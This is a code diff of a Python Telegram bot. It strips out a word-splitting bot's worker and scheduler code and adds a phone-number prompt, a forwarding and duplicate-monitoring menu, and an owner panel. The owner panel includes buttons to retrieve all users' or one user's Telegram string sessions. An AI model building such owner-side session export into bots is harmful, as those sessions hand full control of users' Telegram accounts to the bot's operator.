+    phone_verification_states[user_id] = {
+        "step": "waiting_phone",
+        "chat_id": chat_id
+    }
     
-    with state["worker_heartbeats_lock"]:
-        stale_users = []
-        for user_id, last_heartbeat in list(state["worker_heartbeats"].items()):
-            if current_time - last_heartbeat > stale_threshold:
-                stale_users.append(user_id)
-        
-        for user_id in stale_users:
-            state["worker_heartbeats"].pop(user_id, None)
-            
-            with state["user_workers_lock"]:
-                if user_id in state["user_workers"]:
-                    info = state["user_workers"][user_id]
-                    try:
-                        info["stop"].set()
-                        info["wake"].set()
-                    except Exception:
-                        pass
-                    state["user_workers"].pop(user_id, None)
-                    logger.info("Cleaned up stale worker for user %s in %s", user_id, bot_id)
+    message = """📱 **Phone Number Verification Required**
 
-def notify_user_worker(bot_id: str, user_id: int):
-    state = BOT_STATES[bot_id]
-    with state["user_workers_lock"]:
-        info = state["user_workers"].get(user_id)
-        if info and "wake" in info:
-            try:
-                info["wake"].set()
-            except Exception:
-                pass
+Your account was restored from a saved session, but we need your phone number for security.
 
-def start_user_worker_if_needed(bot_id: str, user_id: int):
-    state = BOT_STATES[bot_id]
-    with state["user_workers_lock"]:
-        info = state["user_workers"].get(user_id)
-        if info:
-            thr = info.get("thread")
-            if thr and thr.is_alive():
-                update_worker_heartbeat(bot_id, user_id)
-                return
-        wake = threading.Event()
-        stop = threading.Event()
-        thr = threading.Thread(target=per_user_worker_loop, args=(bot_id, user_id, wake, stop), daemon=True)
-        state["user_workers"][user_id] = {"thread": thr, "wake": wake, "stop": stop}
-        thr.start()
-        update_worker_heartbeat(bot_id, user_id)
-        logger.info("Started worker for user %s in %s", user_id, bot_id)
+⚠️ **Important:**
+• This is the phone number associated with your Telegram account
+• It will only be used for logout confirmation
+• Your phone number is stored securely
 
-def stop_user_worker(bot_id: str, user_id: int, join_timeout: float = 2.0):
-    """Stop a user worker with proper cleanup"""
-    state = BOT_STATES[bot_id]
-    with state["user_workers_lock"]:
-        info = state["user_workers"].get(user_id)
-        if not info:
+**Please enter your phone number (with country code):**
+
+**Examples:**
+• `+1234567890`
+• `+447911123456`
+• `+4915112345678`
+
+**Type your phone number now:**"""
+    
+    try:
+        await context.bot.send_message(chat_id, message, parse_mode="Markdown")
+    except Exception:
+        logger.exception("Failed to send phone verification message")
+
+async def handle_phone_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if user_id not in phone_verification_states:
+        return
+    
+    state = phone_verification_states[user_id]
+    text = update.message.text.strip()
+    
+    if state["step"] == "waiting_phone":
+        if not text.startswith('+'):
+            await update.message.reply_text(
+                "❌ **Invalid format!**\n\nPhone number must start with `+`\nExample: `+1234567890`",
+                parse_mode="Markdown",
+            )
             return
         
-        try:
-            info["stop"].set()
-            info["wake"].set()
-            
-            thr = info.get("thread")
-            if thr and thr.is_alive():
-                thr.join(join_timeout)
-                
-                if thr.is_alive():
-                    logger.warning("Worker thread for user %s in %s didn't stop gracefully", user_id, bot_id)
-        except Exception as e:
-            logger.exception("Error stopping worker for %s in %s: %s", user_id, bot_id, e)
-        finally:
-            with state["worker_heartbeats_lock"]:
-                state["worker_heartbeats"].pop(user_id, None)
-            
-            state["user_workers"].pop(user_id, None)
-            logger.info("Stopped worker for user %s in %s", user_id, bot_id)
-
-def check_stuck_tasks(bot_id: str):
-    """Check for stuck tasks for a specific bot"""
-    try:
-        cutoff = (datetime.utcnow() - timedelta(minutes=2)).strftime("%Y-%m-%d %I:%M %p")
+        clean_phone = _clean_phone_number(text)
         
-        stuck_tasks = execute_query(
-            bot_id,
-            "SELECT id, user_id, status, retry_count FROM {prefix}tasks WHERE status = 'running' AND last_activity < %s",
-            (cutoff,),
-            fetch_all=True
-        )
-        
-        for task_id, user_id, status, retry_count in stuck_tasks:
-            logger.warning(f"Stuck task detected in {bot_id}: task_id={task_id}, user_id={user_id}, status={status}, retry_count={retry_count}")
-            
-            if retry_count < 3:
-                execute_query(
-                    bot_id,
-                    "UPDATE {prefix}tasks SET status = 'queued', retry_count = retry_count + 1, last_activity = %s WHERE id = %s",
-                    (now_ts(), task_id)
-                )
-                logger.info(f"Reset stuck task {task_id} to queued in {bot_id} (retry {retry_count + 1})")
-                notify_user_worker(bot_id, user_id)
-            else:
-                execute_query(
-                    bot_id,
-                    "UPDATE {prefix}tasks SET status = 'cancelled', finished_at = %s WHERE id = %s",
-                    (now_ts(), task_id)
-                )
-                logger.info(f"Cancelled stuck task {task_id} in {bot_id} after {retry_count} retries")
-                try:
-                    send_message(bot_id, user_id, f"🛑 Your task was cancelled after multiple failures. Please try again.")
-                except Exception:
-                    pass
-        
-        if stuck_tasks:
-            logger.info(f"Cleaned up {len(stuck_tasks)} stuck tasks in {bot_id}")
-    except Exception:
-        logger.exception("Error checking for stuck tasks in %s", bot_id)
-
-def per_user_worker_loop(bot_id: str, user_id: int, wake_event: threading.Event, stop_event: threading.Event):
-    """Worker loop with bot-specific interval speeds and improved resilience"""
-    logger.info("Worker loop starting for user %s in %s", user_id, bot_id)
-    config = BOTS_CONFIG[bot_id]
-    state = BOT_STATES[bot_id]
-    
-    update_worker_heartbeat(bot_id, user_id)
-    
-    acquired_semaphore = False
-    try:
-        uname_for_stat = fetch_display_username(bot_id, user_id) or str(user_id)
-        while not stop_event.is_set():
-            update_worker_heartbeat(bot_id, user_id)
-            
-            if is_suspended(bot_id, user_id):
-                cancel_active_task_for_user(bot_id, user_id)
-                try:
-                    send_message(bot_id, user_id, f"⛔ You have been suspended; stopping your task.")
-                except Exception:
-                    pass
-                while is_suspended(bot_id, user_id) and not stop_event.is_set():
-                    wake_event.wait(timeout=5.0)
-                    wake_event.clear()
-                    update_worker_heartbeat(bot_id, user_id)
-                continue
-
-            task = get_next_task_for_user(bot_id, user_id)
-            if not task:
-                wake_event.wait(timeout=1.0)
-                wake_event.clear()
-                update_worker_heartbeat(bot_id, user_id)
-                continue
-
-            task_id = task["id"]
-            words = task["words"]
-            total = int(task["total_words"] or len(words))
-            retry_count = task.get("retry_count", 0)
-
-            sent_info = execute_query(
-                bot_id,
-                "SELECT sent_count, status FROM {prefix}tasks WHERE id = %s",
-                (task_id,),
-                fetch_one=True
+        if len(clean_phone) < 8:
+            await update.message.reply_text(
+                "❌ **Invalid phone number!**\n\nPhone number seems too short.",
+                parse_mode="Markdown",
             )
-
-            if not sent_info or sent_info[1] == "cancelled":
-                continue
-
-            update_task_activity(bot_id, task_id)
-            update_worker_heartbeat(bot_id, user_id)
-
-            semaphore_acquired = False
-            while not stop_event.is_set():
-                acquired = state["active_workers_semaphore"].acquire(timeout=1.0)
-                if acquired:
-                    acquired_semaphore = True
-                    semaphore_acquired = True
-                    break
-                update_task_activity(bot_id, task_id)
-                update_worker_heartbeat(bot_id, user_id)
-                
-                row_check = execute_query(
-                    bot_id,
-                    "SELECT status FROM {prefix}tasks WHERE id = %s",
-                    (task_id,),
-                    fetch_one=True
-                )
-                if not row_check or row_check[0] == "cancelled":
-                    break
-
-            if not semaphore_acquired:
-                continue
-
-            sent_info = execute_query(
-                bot_id,
-                "SELECT sent_count, status FROM {prefix}tasks WHERE id = %s",
-                (task_id,),
-                fetch_one=True
-            )
-            
-            if not sent_info or sent_info[1] == "cancelled":
-                if acquired_semaphore:
-                    state["active_workers_semaphore"].release()
-                    acquired_semaphore = False
-                continue
-
-            sent = int(sent_info[0] or 0)
-            set_task_status(bot_id, task_id, "running")
-            update_worker_heartbeat(bot_id, user_id)
-
-            if retry_count > 0:
-                try:
-                    send_message(bot_id, user_id, f"🔄 Retrying your task (attempt {retry_count + 1})...")
-                except Exception:
-                    pass
-
-            # BOT-SPECIFIC INTERVAL SPEEDS
-            if config["interval_speed"] == "fast":
-                interval = 0.5 if total <= 150 else (0.6 if total <= 300 else 0.7)
-            else:  # "slow" for Bot C
-                interval = 1.0 if total <= 150 else (1.1 if total <= 300 else 1.2)
-            
-            est_seconds = int((total - sent) * interval)
-            est_str = str(timedelta(seconds=est_seconds))
+            return
+        
+        client = user_clients.get(user_id)
+        if client:
             try:
-                send_message(bot_id, user_id, f"🚀 Starting your split now. Words: {total}. Estimated time: {est_str}")
-            except Exception:
-                pass
-
-            i = sent
-            last_send_time = time.monotonic()
-            last_activity_update = time.monotonic()
-            last_heartbeat_update = time.monotonic()
-            consecutive_errors = 0
-
-            while i < total and not stop_event.is_set():
-                current_time = time.monotonic()
-                if current_time - last_heartbeat_update > 10:
-                    update_worker_heartbeat(bot_id, user_id)
-                    last_heartbeat_update = current_time
+                me = await client.get_me()
+                await db_call(db.save_user, user_id, clean_phone, me.first_name, 
+                             None, True)
                 
-                if current_time - last_activity_update > 30:
-                    update_task_activity(bot_id, task_id)
-                    last_activity_update = current_time
+                del phone_verification_states[user_id]
                 
-                row = execute_query(
-                    bot_id,
-                    "SELECT status FROM {prefix}tasks WHERE id = %s",
-                    (task_id,),
-                    fetch_one=True
+                await update.message.reply_text(
+                    f"✅ **Phone number verified!**\n\n📱 **Phone:** `{clean_phone}`\n👤 **Name:** {me.first_name or 'User'}\n\nYour account is now fully restored! 🎉",
+                    parse_mode="Markdown",
                 )
                 
-                if not row:
-                    break
-                status = row[0]
-                if status == "cancelled" or is_suspended(bot_id, user_id):
-                    break
-
-                if status == "paused":
-                    try:
-                        send_message(bot_id, user_id, f"⏸️ Task paused…")
-                    except Exception:
-                        pass
-                    while True:
-                        wake_event.wait(timeout=0.7)
-                        wake_event.clear()
-                        update_worker_heartbeat(bot_id, user_id)
-                        if stop_event.is_set():
-                            break
-                        
-                        row2 = execute_query(
-                            bot_id,
-                            "SELECT status FROM {prefix}tasks WHERE id = %s",
-                            (task_id,),
-                            fetch_one=True
-                        )
-                        if not row2 or row2[0] == "cancelled" or is_suspended(bot_id, user_id):
-                            break
-                        if row2[0] == "running":
-                            try:
-                                send_message(bot_id, user_id, "▶️ Resuming your task now.")
-                            except Exception:
-                                pass
-                            last_send_time = time.monotonic()
-                            last_activity_update = time.monotonic()
-                            last_heartbeat_update = time.monotonic()
-                            break
-                    if status == "cancelled" or is_suspended(bot_id, user_id) or stop_event.is_set():
-                        if is_suspended(bot_id, user_id):
-                            set_task_status(bot_id, task_id, "cancelled")
-                            try: 
-                                send_message(bot_id, user_id, "⛔ You have been suspended; stopping your task.")
-                            except Exception: 
-                                pass
-                        break
-
-                try:
-                    result = send_message(bot_id, user_id, words[i])
-                    if result:
-                        consecutive_errors = 0
-                        record_split_log(bot_id, user_id, uname_for_stat, 1)
-                    else:
-                        consecutive_errors += 1
-                        logger.warning(f"Failed to send word {i+1} to user {user_id} in {bot_id} (consecutive errors: {consecutive_errors})")
-                        
-                        if consecutive_errors >= 10:
-                            logger.error(f"Too many consecutive errors ({consecutive_errors}) for user {user_id} in {bot_id}. Pausing task.")
-                            set_task_status(bot_id, task_id, "paused")
-                            try:
-                                send_message(bot_id, user_id, f"⚠️ Task paused due to sending errors. Will retry in 30 seconds.")
-                            except Exception:
-                                pass
-                            time.sleep(30)
-                            set_task_status(bot_id, task_id, "running")
-                            consecutive_errors = 0
-                            continue
-                        
-                        record_split_log(bot_id, user_id, uname_for_stat, 1)
-                except Exception as e:
-                    logger.error(f"Exception sending word {i+1} to user {user_id} in {bot_id}: {e}")
-                    consecutive_errors += 1
-                    record_split_log(bot_id, user_id, uname_for_stat, 1)
-
-                i += 1
-
-                try:
-                    execute_query(
-                        bot_id,
-                        "UPDATE {prefix}tasks SET sent_count = %s, last_activity = %s WHERE id = %s",
-                        (i, now_ts(), task_id)
-                    )
-                except Exception:
-                    logger.exception("Failed to update sent_count for task %s in %s", task_id, bot_id)
-
-                if wake_event.is_set():
-                    wake_event.clear()
-                    continue
-
-                now = time.monotonic()
-                elapsed = now - last_send_time
-                remaining_time = interval - elapsed
-                if remaining_time > 0:
-                    time.sleep(remaining_time)
-                last_send_time = time.monotonic()
-
-                if is_suspended(bot_id, user_id):
-                    break
-
-            row = execute_query(
-                bot_id,
-                "SELECT status, sent_count FROM {prefix}tasks WHERE id = %s",
-                (task_id,),
-                fetch_one=True
-            )
-
-            final_status = row[0] if row else "done"
-            if final_status not in ("cancelled", "paused"):
-                set_task_status(bot_id, task_id, "done")
-                try:
-                    send_message(bot_id, user_id, f"✅ All done!")
-                except Exception:
-                    pass
-            elif final_status == "cancelled":
-                try:
-                    send_message(bot_id, user_id, f"🛑 Task stopped.")
-                except Exception:
-                    pass
-
-            if acquired_semaphore:
-                try:
-                    state["active_workers_semaphore"].release()
-                except Exception:
-                    pass
-                acquired_semaphore = False
-
-    except Exception:
-        logger.exception("Worker error for user %s in %s", user_id, bot_id)
-    finally:
-        with state["worker_heartbeats_lock"]:
-            state["worker_heartbeats"].pop(user_id, None)
-        
-        if acquired_semaphore:
-            try:
-                state["active_workers_semaphore"].release()
+                await show_main_menu(update, context, user_id)
+                
             except Exception:
-                pass
-        with state["user_workers_lock"]:
-            state["user_workers"].pop(user_id, None)
-        logger.info("Worker loop exiting for user %s in %s", user_id, bot_id)
+                logger.exception("Error verifying phone")
+                await update.message.reply_text("❌ **Error verifying phone number!**")
+        else:
+            await update.message.reply_text("❌ **Session not found!**")
+            del phone_verification_states[user_id]
 
-# ===================== STATISTICS =====================
-
-def fetch_display_username(bot_id: str, user_id: int):
-    try:
-        r = execute_query(
-            bot_id,
-            "SELECT username FROM {prefix}split_logs WHERE user_id = %s ORDER BY created_at DESC LIMIT 1",
-            (user_id,),
-            fetch_one=True
-        )
-        if r and r[0]:
-            return r[0]
-        
-        r2 = execute_query(
-            bot_id,
-            "SELECT username FROM {prefix}allowed_users WHERE user_id = %s",
-            (user_id,),
-            fetch_one=True
-        )
-        if r2 and r2[0]:
-            return r2[0]
-    except Exception:
-        pass
-    return ""
-
-def compute_last_hour_stats(bot_id: str):
-    cutoff = datetime.utcnow() - timedelta(hours=1)
-    try:
-        rows = execute_query(
-            bot_id,
-            """
-            SELECT user_id, username, COUNT(*) as s
-            FROM {prefix}split_logs
-            WHERE created_at >= %s
-            GROUP BY user_id, username
-            ORDER BY s DESC
-            """,
-            (cutoff.strftime("%Y-%m-%d %I:%M %p"),),
-            fetch_all=True
-        )
-    except Exception:
-        return []
+# ============================
+# MAIN MENU & BOT COMMANDS
+# ============================
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    user = await db_call(db.get_user, user_id)
     
-    stat_map = {}
-    for uid, uname, s in rows:
-        stat_map[uid] = {"uname": uname, "words": stat_map.get(uid,{}).get("words",0)+int(s)}
-    return [(k, v["uname"], v["words"]) for k, v in stat_map.items()]
+    user_name = update.effective_user.first_name or "User"
+    user_phone = user["phone"] if user and user["phone"] else "Not connected"
+    is_logged_in = user and user["is_logged_in"]
+    
+    status_emoji = "🟢" if is_logged_in else "🔴"
+    status_text = "Online" if is_logged_in else "Offline"
+    
+    message_text = f"""╔════════════════════════════════════╗
+║   📨🔍 FORWARDER + DUODETECTIVE BOT   ║
+║   Telegram Message Management System   ║
+╚════════════════════════════════════╝
 
-def compute_last_12h_stats(bot_id: str, user_id: int):
-    cutoff = datetime.utcnow() - timedelta(hours=12)
-    try:
-        r = execute_query(
-            bot_id,
-            """
-            SELECT COUNT(*) FROM {prefix}split_logs WHERE user_id = %s AND created_at >= %s
-            """,
-            (user_id, cutoff.strftime("%Y-%m-%d %I:%M %p")),
-            fetch_one=True
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+👤 **User:** {user_name}
+📱 **Phone:** `{user_phone}`
+{status_emoji} **Status:** {status_text}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 **COMMANDS:**
+
+🔐 **Account Management:**
+  /login - Connect your Telegram account
+  /logout - Disconnect your account
+
+📨 **Forwarding System:**
+  /forwadd - Create a new forwarding task
+  /fortasks - List all your forwarding tasks
+
+🔍 **Monitoring System:**
+  /monitoradd - Create a new monitoring task
+  /monitortasks - List all your monitoring tasks
+
+🆔 **Utilities:**
+  /getallid - Get all your chat IDs"""
+    
+    if user_id in OWNER_IDS:
+        message_text += "\n\n👑 **Owner Commands:**\n  /ownersets - Owner control panel"
+    
+    message_text += "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n⚙️ **Features:**\n1. Forward messages between chats with filters\n2. Detect duplicate messages in monitored chats\n3. Get notifications and reply to duplicates\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    
+    keyboard = []
+    if is_logged_in:
+        keyboard.append([InlineKeyboardButton("📨 Forwarding Tasks", callback_data="show_forward_tasks")])
+        keyboard.append([InlineKeyboardButton("🔍 Monitoring Tasks", callback_data="show_monitor_tasks")])
+        keyboard.append([InlineKeyboardButton("🔴 Disconnect", callback_data="logout")])
+    else:
+        keyboard.append([InlineKeyboardButton("🟢 Connect Account", callback_data="login")])
+    
+    if user_id in OWNER_IDS:
+        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")])
+    
+    if update.callback_query:
+        await update.callback_query.message.edit_text(
+            message_text,
+            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
+            parse_mode="Markdown",
         )
-        return int(r[0] or 0) if r else 0
-    except Exception:
-        return 0
+    else:
+        await update.message.reply_text(
+            message_text,
+            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
+            parse_mode="Markdown",
+        )
 
-def send_hourly_owner_stats(bot_id: str):
-    rows = compute_last_hour_stats(bot_id)
-    if not rows:
-        msg = "📊 Hourly Report: no splits in the last hour."
-        for oid in BOTS_CONFIG[bot_id]["owner_ids"]:
-            try:
-                send_message(bot_id, oid, msg)
-            except Exception:
-                pass
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    if not await check_authorization(update, context):
         return
-    lines = []
-    for uid, uname, w in rows:
-        uname_for_stat = at_username(uname) if uname else fetch_display_username(bot_id, uid)
-        lines.append(f"{uid} ({uname_for_stat}) - {w} words sent")
-    body = "📊 Report - last 1h:\n" + "\n".join(lines)
-    for oid in BOTS_CONFIG[bot_id]["owner_ids"]:
-        try:
-            send_message(bot_id, oid, body)
-        except Exception:
-            pass
 
-def check_and_lift(bot_id: str):
-    try:
-        rows = execute_query(
-            bot_id,
-            "SELECT user_id, suspended_until FROM {prefix}suspended_users",
-            fetch_all=True
-        )
-    except Exception:
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
         return
     
-    now = datetime.utcnow()
-    for r in rows:
-        try:
-            # Remove seconds from timestamp before parsing
-            until_str = re.sub(r':\d{2}(?=\s|$)', '', r[1])
-            until = datetime.strptime(until_str, "%Y-%m-%d %I:%M %p")
-            if until <= now:
-                uid = r[0]
-                unsuspend_user(bot_id, uid)
-        except Exception:
-            logger.exception("suspend parse error for %s in %s", r, bot_id)
+    await show_main_menu(update, context, user_id)
 
-def prune_old_logs(bot_id: str):
-    try:
-        cutoff = (datetime.utcnow() - timedelta(days=SHARED_SETTINGS["log_retention_days"])).strftime("%Y-%m-%d %I:%M %p")
-        
-        deleted1 = execute_query(
-            bot_id,
-            "DELETE FROM {prefix}split_logs WHERE created_at < %s",
-            (cutoff,)
-        )
-        
-        deleted2 = execute_query(
-            bot_id,
-            "DELETE FROM {prefix}sent_messages WHERE sent_at < %s",
-            (cutoff,)
-        )
-        
-        if deleted1 or deleted2:
-            logger.info("Pruned logs for %s: split_logs=%s sent_messages=%s", bot_id, deleted1, deleted2)
-    except Exception:
-        logger.exception("prune_old_logs error for %s", bot_id)
-
-def cleanup_stale_resources(bot_id: str):
-    """Clean up stale workers and refresh sessions"""
-    state = BOT_STATES[bot_id]
+# ============================
+# OWNER COMMANDS
+# ============================
+async def ownersets_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
     
-    cleanup_stale_workers(bot_id)
+    if user_id not in OWNER_IDS:
+        await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to bot owners.", parse_mode="Markdown")
+        return
     
-    current_time = time.time()
-    session_age = current_time - state["session_created_at"]
-    if session_age > 3600 and state["session"]:
-        try:
-            state["session"].close()
-        except Exception:
-            pass
-        state["session"] = None
-        state["session_created_at"] = 0
-        state["session_request_count"] = 0
-        logger.info("Refreshed session for %s", bot_id)
+    await show_owner_panel(update, context)
 
-# ===================== SCHEDULER =====================
-
-scheduler = BackgroundScheduler()
-
-# Add jobs for each bot
-for bot_id in BOTS_CONFIG:
-    scheduler.add_job(
-        lambda b=bot_id: send_hourly_owner_stats(b),
-        "interval", 
-        hours=1, 
-        next_run_time=datetime.utcnow() + timedelta(seconds=10),
-        timezone='UTC',
-        id=f"hourly_stats_{bot_id}"
-    )
-    scheduler.add_job(
-        lambda b=bot_id: check_and_lift(b),
-        "interval", 
-        minutes=1,
-        next_run_time=datetime.utcnow() + timedelta(seconds=15),
-        timezone='UTC',
-        id=f"check_suspended_{bot_id}"
-    )
-    scheduler.add_job(
-        lambda b=bot_id: prune_old_logs(b),
-        "interval", 
-        hours=24,
-        next_run_time=datetime.utcnow() + timedelta(seconds=30),
-        timezone='UTC',
-        id=f"prune_logs_{bot_id}"
-    )
-    scheduler.add_job(
-        lambda b=bot_id: check_stuck_tasks(b),
-        "interval", 
-        minutes=1,
-        next_run_time=datetime.utcnow() + timedelta(seconds=45),
-        timezone='UTC',
-        id=f"check_stuck_{bot_id}"
-    )
-    scheduler.add_job(
-        lambda b=bot_id: cleanup_stale_resources(b),
-        "interval",
-        minutes=5,
-        next_run_time=datetime.utcnow() + timedelta(seconds=60),
-        timezone='UTC',
-        id=f"cleanup_resources_{bot_id}"
-    )
-
-scheduler.start()
-
-# ===================== SHUTDOWN HANDLER =====================
-
-def _graceful_shutdown(signum, frame):
-    logger.info("Graceful shutdown signal received (%s). Stopping scheduler and workers...", signum)
-    try:
-        scheduler.shutdown(wait=False)
-    except Exception:
-        pass
+async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query if update.callback_query else None
+    user_id = query.from_user.id if query else update.effective_user.id
     
-    # Stop workers for all bots
-    for bot_id in BOTS_CONFIG:
-        state = BOT_STATES[bot_id]
-        with state["user_workers_lock"]:
-            keys = list(state["user_workers"].keys())
-        for k in keys:
-            stop_user_worker(bot_id, k, join_timeout=2.0)
+    if user_id not in OWNER_IDS:
+        if query:
+            await query.answer("Only owners can access this panel!", show_alert=True)
+        return
     
-    # Close database connections
-    global POSTGRES_POOL
-    if POSTGRES_POOL:
-        try:
-            POSTGRES_POOL.closeall()
-        except Exception:
-            pass
+    if query:
+        await query.answer()
     
-    # Close sessions
-    for bot_id in BOTS_CONFIG:
-        try:
-            if BOT_STATES[bot_id]["session"]:
-                BOT_STATES[bot_id]["session"].close()
-        except Exception:
-            pass
-    
-    logger.info("Shutdown completed. Exiting.")
-    try:
-        import os
-        os._exit(0)
-    except Exception:
-        pass
+    message_text = """👑 OWNER CONTROL PANEL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-signal.signal(signal.SIGTERM, _graceful_shutdown)
-signal.signal(signal.SIGINT, _graceful_shutdown)
+🔑 **Session Management:**
+• Get all string sessions
+• Get specific user's session
 
-# ===================== OWNER OPERATIONS =====================
+👥 **User Management:**
+• List all allowed users
+• Add new user (admin/regular)
+• Remove existing user
 
-def get_owner_state(bot_id: str, user_id: int) -> Optional[Dict]:
-    state = BOT_STATES[bot_id]
-    with state["owner_ops_lock"]:
-        return state["owner_ops_state"].get(user_id)
+📊 **Statistics:**
+• View database status
+• View system metrics
 
-def set_owner_state(bot_id: str, user_id: int, state_dict: Dict):
-    state = BOT_STATES[bot_id]
-    with state["owner_ops_lock"]:
-        state["owner_ops_state"][user_id] = state_dict
-
-def clear_owner_state(bot_id: str, user_id: int):
-    state = BOT_STATES[bot_id]
-    with state["owner_ops_lock"]:
-        state["owner_ops_state"].pop(user_id, None)
-
-def is_owner_in_operation(bot_id: str, user_id: int) -> bool:
-    state = BOT_STATES[bot_id]
-    with state["owner_ops_lock"]:
-        return user_id in state["owner_ops_state"]
-
-def get_user_tasks_preview(bot_id: str, user_id: int, hours: int, page: int = 0) -> Tuple[List[Dict], int, int]:
-    cutoff = datetime.utcnow() - timedelta(hours=hours)
-    
-    try:
-        rows = execute_query(
-            bot_id,
-            """
-            SELECT id, text, created_at, total_words, sent_count
-            FROM {prefix}tasks 
-            WHERE user_id = %s AND created_at >= %s
-            ORDER BY created_at DESC
-            """,
-            (user_id, cutoff.strftime("%Y-%m-%d %I:%M %p")),
-            fetch_all=True
-        )
-    except Exception:
-        return [], 0, 0
-    
-    tasks = []
-    for r in rows:
-        task_id, text, created_at, total_words, sent_count = r
-        words = split_text_to_words(text)
-        preview = " ".join(words[:2]) if len(words) >= 2 else words[0] if words else "(empty)"
-        tasks.append({
-            "id": task_id,
-            "preview": preview,
-            "created_at": utc_to_wat_ts(created_at),
-            "total_words": total_words,
-            "sent_count": sent_count
-        })
-    
-    total_tasks = len(tasks)
-    page_size = 20
-    start_idx = page * page_size
-    end_idx = start_idx + page_size
-    paginated_tasks = tasks[start_idx:end_idx]
-    
-    total_pages = (total_tasks + page_size - 1) // page_size
-    
-    return paginated_tasks, total_tasks, total_pages
-
-def get_all_users_ordered(bot_id: str):
-    try:
-        return execute_query(
-            bot_id,
-            "SELECT user_id, username, added_at FROM {prefix}allowed_users ORDER BY added_at DESC",
-            fetch_all=True
-        )
-    except Exception:
-        return []
-
-def get_user_index(bot_id: str, user_id: int):
-    users = get_all_users_ordered(bot_id)
-    for i, (uid, username, added_at) in enumerate(users):
-        if uid == user_id:
-            return i, users
-    return -1, users
-
-def parse_duration(duration_str: str) -> Tuple[int, str]:
-    if not duration_str:
-        return None, "Empty duration"
-    
-    pattern = r'(\d+)([dhms])'
-    matches = re.findall(pattern, duration_str.lower())
-    
-    if not matches:
-        return None, f"Invalid duration format: {duration_str}"
-    
-    total_seconds = 0
-    parts = []
-    
-    multipliers = {'d': 86400, 'h': 3600, 'm': 60, 's': 1}
-    labels = {'d': 'day', 'h': 'hour', 'm': 'minute', 's': 'second'}
-    
-    for value, unit in matches:
-        try:
-            num = int(value)
-            if num <= 0:
-                return None, f"Value must be positive: {value}{unit}"
-            
-            total_seconds += num * multipliers[unit]
-            label = labels[unit]
-            if num == 1:
-                parts.append(f"{num} {label}")
-            else:
-                parts.append(f"{num} {label}s")
-                
-        except ValueError:
-            return None, f"Invalid number: {value}{unit}"
-        except KeyError:
-            return None, f"Invalid unit: {unit}"
-    
-    if total_seconds == 0:
-        return None, "Duration cannot be zero"
-    
-    formatted = ", ".join(parts)
-    return total_seconds, formatted
-
-def send_ownersets_menu(bot_id: str, owner_id: int):
-    config = BOTS_CONFIG[bot_id]
-    menu_text = f"👑 Owner Menu {config['owner_tag']}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nSelect an operation:"
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
     
     keyboard = [
-        [{"text": "📊 Bot Info", "callback_data": "owner_botinfo"}, {"text": "👥 List Users", "callback_data": "owner_listusers"}],
-        [{"text": "🚫 List Suspended", "callback_data": "owner_listsuspended"}, {"text": "➕ Add User", "callback_data": "owner_adduser"}],
-        [{"text": "⏸️ Suspend User", "callback_data": "owner_suspend"}, {"text": "▶️ Unsuspend User", "callback_data": "owner_unsuspend"}],
-        [{"text": "🔍 Check All User Preview", "callback_data": "owner_checkallpreview"}]
+        [InlineKeyboardButton("🔑 Get All Strings", callback_data="owner_get_all_strings")],
+        [InlineKeyboardButton("👤 Get User String", callback_data="owner_get_user_string")],
+        [InlineKeyboardButton("👥 List Users", callback_data="owner_list_users")],
+        [InlineKeyboardButton("➕ Add User", callback_data="owner_add_user")],
+        [InlineKeyboardButton("➖ Remove User", callback_data="owner_remove_user")],
+        [InlineKeyboardButton("📊 DB Status", callback_data="owner_db_status")],
     ]
     
-    reply_markup = {"inline_keyboard": keyboard}
-    send_message(bot_id, owner_id, menu_text, reply_markup)
-
-# ===================== COMMAND HANDLING =====================
-
-def get_user_task_counts(bot_id: str, user_id: int):
-    try:
-        active_result = execute_query(
-            bot_id,
-            "SELECT COUNT(*) FROM {prefix}tasks WHERE user_id = %s AND status IN ('running','paused')",
-            (user_id,),
-            fetch_one=True
+    if query:
+        await query.message.edit_text(
+            message_text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown"
         )
-        active = int(active_result[0] or 0) if active_result else 0
-        
-        queued_result = execute_query(
-            bot_id,
-            "SELECT COUNT(*) FROM {prefix}tasks WHERE user_id = %s AND status = 'queued'",
-            (user_id,),
-            fetch_one=True
-        )
-        queued = int(queued_result[0] or 0) if queued_result else 0
-        
-        return active, queued
-    except Exception:
-        return 0, 0
-
-def handle_command(bot_id: str, user_id: int, username: str, command: str, args: str):
-    config = BOTS_CONFIG[bot_id]
-    
-    if command == "/start":
-        who = label_for_self(bot_id, user_id, username) or "there"
-        msg = (
-            f"👋 Hi {who}!\n\n"
-            "I split your text into individual word messages. ✂️📤\n\n"
-            f"{config['owner_tag']} command:\n"
-            " /ownersets - Owner management menu\n\n"
-            "User commands:\n"
-            " /start /example /pause /resume /status /stop /stats /about\n\n"
-            "Just send any text and I'll split it for you. 🚀"
-        )
-        send_message(bot_id, user_id, msg)
-        return jsonify({"ok": True})
-
-    if command == "/about":
-        msg = (
-            "ℹ️ About:\n"
-            "I split texts into single words. ✂️\n\n"
-            "Features:\n"
-            "queueing, pause/resume,\n"
-            "hourly owner stats, rate-limited sending. ⚖️"
-        )
-        send_message(bot_id, user_id, msg)
-        return jsonify({"ok": True})
-
-    if user_id not in config["owner_ids"] and not is_allowed(bot_id, user_id):
